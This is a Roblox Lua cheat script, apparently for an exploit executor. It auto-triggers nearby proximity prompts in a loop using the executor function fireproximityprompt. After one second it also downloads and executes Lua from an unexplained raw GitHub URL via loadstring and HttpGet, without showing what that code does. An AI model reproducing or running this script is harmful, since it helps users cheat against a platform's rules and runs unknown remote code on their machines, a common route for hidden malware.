local Players = game:GetService("Players")

local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local autoInteract = true
local autoLoadScript = true
local maxDistance = 30
local checkInterval = 0.2
local clickCooldown = 0.01

player.CharacterAdded:Connect(function(newChar)
    character = newChar
end)

local function getCharacterPosition()
    if character and character:FindFirstChild("HumanoidRootPart") then
        return character.HumanoidRootPart.Position
    end
    return nil
end

local function getNearestProximityPrompt()
    local charPos = getCharacterPosition()
    if not charPos then return nil end
    
    local nearestPrompt = nil
    local nearestDistance = maxDistance
    
    for _, descendant in pairs(workspace:GetDescendants()) do
        if descendant:IsA("ProximityPrompt") then
            local promptPos
            if descendant.Parent and descendant.Parent:IsA("BasePart") then
                promptPos = descendant.Parent.Position
            elseif descendant.Parent and descendant.Parent.Parent and descendant.Parent.Parent:IsA("BasePart") then
                promptPos = descendant.Parent.Parent.Position
            end
            
            if promptPos then
                local distance = (charPos - promptPos).Magnitude
                if distance <= maxDistance and distance < nearestDistance then
                    nearestDistance = distance
                    nearestPrompt = descendant
                end
            end
        end
    end
    
    return nearestPrompt, nearestDistance
end

local function autoClickLoop()
    while autoInteract do
        task.wait(checkInterval)
        
        local prompt, distance = getNearestProximityPrompt()
        if prompt then
            fireproximityprompt(prompt)
            task.wait(clickCooldown)
        end
    end
end

local function loadExternalScript()
    local success, err = pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/qwrt5589/eododo/f5fc702616bfbae121736a917958c1a2f18ee48d/46644949.lua"))()
    end)
    
    if success then
        print("执行成功")
    else
        warn("执行失败", err)
    end
end

task.spawn(function()
    coroutine.wrap(autoClickLoop)()
end)

task.spawn(function()
    task.wait(1)
    if autoLoadScript then
        loadExternalScript()
    end
end)

print("该脚本由宇神之作")